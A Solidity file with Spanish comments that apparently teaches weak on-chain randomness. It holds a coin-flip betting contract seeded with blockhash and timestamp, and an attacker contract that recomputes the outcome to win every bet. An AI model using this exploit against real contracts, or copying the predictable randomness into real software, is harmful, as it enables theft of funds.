// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

contract Moneda {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() payable {}

    function flip(bool _guess) public payable {
        require(msg.value == 1 ether, "Not enough Ether");

        uint256 randomNumber = uint256(
            keccak256(
                abi.encodePacked(
                    msg.sender,
                    blockhash(block.number - 1),
                    block.timestamp
                )
            )
        );

        /**
         * coinFlip puede tener solo dos valores: 0 o 1
         * Si randomNumber es mayor a FACTOR, coinFlip = 1
         * Si randomNumber es menor a FACTOR, coinFlip = 0
         */
        uint256 coinFlip = randomNumber / FACTOR;
        bool guess = coinFlip == 1 ? true : false;

        if (_guess == guess) {
            // Ganaste
            payable(msg.sender).transfer(2 ether);
        }
    }
}

interface IMoneda {
    function flip(bool _guess) external payable;
}

contract HackerMoneda {
    IMoneda coinFlipSC;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipAddress) payable {
        coinFlipSC = IMoneda(_coinFlipAddress);
    }

    /**
     * 'attack' y 'flip' son dos funciones que se ejecutan en la misma transacción
     * Es por ello que ambos métodos comparten algunas variables globales
     * En este caso, el hacker llama 'flip' dentro de 'attack' para aprovecharse de ello
     * El atacante es capaz de realizar el mismo cálculo de 'coinFlip' que el contrato original
     * Así logra adivinar el resultado y ganar la apuesta repetidas veces
     */
    function attack() public {
        uint256 randomNumber = uint256(
            keccak256(
                abi.encodePacked(
                    address(this),
                    blockhash(block.number - 1),
                    block.timestamp
                )
            )
        );
        uint256 coinFlip = randomNumber / FACTOR;
        bool _guess = coinFlip == 1 ? true : false;

        coinFlipSC.flip{value: 1 ether}(_guess);
    }

    receive() external payable {}
}
